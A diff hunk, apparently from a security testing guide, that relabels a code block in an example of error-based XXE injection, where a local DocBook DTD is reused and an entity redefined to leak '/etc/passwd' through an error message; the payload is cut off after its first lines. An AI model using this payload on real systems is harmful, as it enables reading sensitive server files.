@@ -801,7 +801,7 @@ Example test:
 * Goal: trigger an error message containing `/etc/passwd` by referencing an existing DTD and redefining an entity from it.
 * Hybrid payload (example):
 
-```dtd
+```xml
 <!DOCTYPE message [
 <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 <!ENTITY % ISOamso '
